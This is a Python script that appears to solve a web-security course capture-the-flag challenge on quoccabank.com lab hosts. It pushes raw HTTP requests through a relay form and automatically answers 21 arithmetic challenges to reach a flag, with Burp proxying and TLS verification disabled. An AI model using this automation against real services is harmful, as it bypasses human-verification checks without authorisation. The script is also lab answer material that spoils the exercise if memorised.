import requests
import re
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create a session object to save settings for the lifetime of the script.
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

def create_payload(cookie, num):
    payload = """POST /calculator HTTP/1.1
Host: kb.quoccabank.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=""" + cookie + ";\nContent-Length: " + str(7 + len(str(num))) + "\n\n" + "answer=" + str(num) + "\n"
    return payload

def extract_sum(content):
    nums = re.findall(r'(\d+)\+(\d+)', content)
    if nums:
        return sum(int(i) for i in nums[0])
    else:
        return None

def extract_cookie(content):
    sessionCookie = re.findall(r'session=([^;]*)', content)
    if sessionCookie:
        return sessionCookie[0]
    else:
        return None

payload = """GET /calculator HTTP/1.1
Host: kb.quoccabank.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://haas.quoccabank.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://haas.quoccabank.com
Connection: keep-alive\n\n"""

data = {
    "requestBox": payload,
}

r = s.post("http://haas.quoccabank.com", data=data)
content = r.content.decode()
print(content)
cookie = extract_cookie(content)
num = extract_sum(content)

for _ in range(21):
    payload = create_payload(cookie, num)
    print(payload)

    data = {
        "requestBox": payload,
    }

    r = s.post("http://haas.quoccabank.com", data=data)
    content = r.content.decode()
    print("RESULT +_____________________\n" + content)
    cookie = extract_cookie(content)
    num = extract_sum(content)

search = re.search(r'.*COMP6443.*', content)
if search:
    print(search.group())
